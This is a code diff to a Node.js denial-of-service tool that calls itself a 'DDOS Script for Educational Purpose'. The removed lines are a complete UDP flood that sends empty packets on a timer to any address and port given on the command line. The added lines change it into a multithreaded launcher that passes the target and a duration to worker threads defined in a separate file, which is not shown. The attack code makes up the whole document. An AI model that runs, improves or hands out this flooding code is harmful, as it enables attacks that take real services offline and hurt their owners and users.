@@ -1,22 +1,32 @@
-const dgram = require('dgram');
-const client = dgram.createSocket('udp4');
+const { Worker } = require('worker_threads');
 
-const args = process.argv;
+console.log(`       
+            ██╗░░░░░███████╗░█████╗░██████╗░██╗░░██╗██████╗░
+            ██║░░░░░██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗
+            ██║░░░░░█████╗░░███████║██████╔╝░╚███╔╝░██║░░██║
+            ██║░░░░░██╔══╝░░██╔══██║██╔══██╗░██╔██╗░██║░░██║
+            ███████╗███████╗██║░░██║██║░░██║██╔╝╚██╗██████╔╝
+            ╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
+            
+                  DDOS Script for Educational Purpose
+`)
 
-const address = args[2]
-const port = args[3]
+const [node, dir, address, port, threads = 4, time = 5] = process.argv;
 
-const times = args[4] ?? 1000
+if (!address || !port) {
+  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
+}
 
-if(!address || !port)
-  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
+for (let i = 0; i < threads; i++) {
+  console.log(`[DDOS] Starting thread #${i}...`)
 
-client.on('error', (e) => {
-  console.log('[ERROR]: ' + e)
-  process.kill(process.pid);
-})
+  const worker = new Worker('./worker.js');
+  worker.postMessage({
+    address,
+    port,
+    time,
+    thread: i
+  });
+}
 
-setInterval(() => {
-    client.send('', 0, 0, port, address);
-    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
-}, (1000 / (times <= 0 ? 1000 : times)))
+console.log("[DDOS] Starting in 3 seconds...")
